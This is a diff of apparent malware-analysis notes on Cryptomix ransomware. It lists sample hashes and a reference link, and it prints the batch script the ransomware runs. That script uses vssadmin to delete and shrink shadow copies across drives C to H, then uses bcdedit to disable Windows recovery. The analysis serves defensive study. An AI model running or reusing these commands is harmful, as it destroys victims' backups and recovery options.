@@ -3,9 +3,9 @@
 Cryptomix Ransomware Mal Helper
 
 Packed Digital Signed Crypted Bin:
-`SHA-256: 10f4be34c2e41e6c2d4932ab77f189cf5da659abd028537604eae6435c83516a`
+```SHA-256: 10f4be34c2e41e6c2d4932ab77f189cf5da659abd028537604eae6435c83516a`
 Unpacked Ransomware Bin:
-`SHA-256: MDYxOThmZWQwMjlhZGJjOTA3OTZjYTZkODNhNjc3ODk6MTU1MDc4Mjc4NA`
+```SHA-256: 79b8c37a5e2a32e8f7e000822cec6f2f4e317620a2296f1aa3f35b2374c396ec```
 Reference: https://twitter.com/malwrhunterteam/status/1098578106112245760
 
 ```bytearray(b'@echo off\r\nvssadmin Delete Shadows /all /quiet\r\nvssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded\r\nvssadmin Delete Shadows /all /quiet\t\t\r\nbcdedit /set {default} recoveryenabled No\r\nbcdedit /set {default} bootstatuspolicy ignoreallfailures\t ')```
